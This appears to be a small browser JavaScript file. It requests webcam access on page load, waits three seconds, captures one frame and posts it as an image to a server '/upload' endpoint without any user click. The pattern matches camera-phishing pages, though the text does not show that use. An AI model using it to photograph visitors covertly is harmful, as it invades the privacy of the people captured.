window.onload = function () {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    captureAndSend();
                }, 3000); // 3s delay before capture
            };
        })
        .catch(err => {
            console.error("Permission denied or no camera", err);
        });

    function captureAndSend() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        const dataURL = canvas.toDataURL('image/jpeg');
        fetch('/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'image=' + encodeURIComponent(dataURL)
        })
        .then(res => res.text())
        .then(data => console.log(data))
        .catch(err => console.error(err));
    }
};
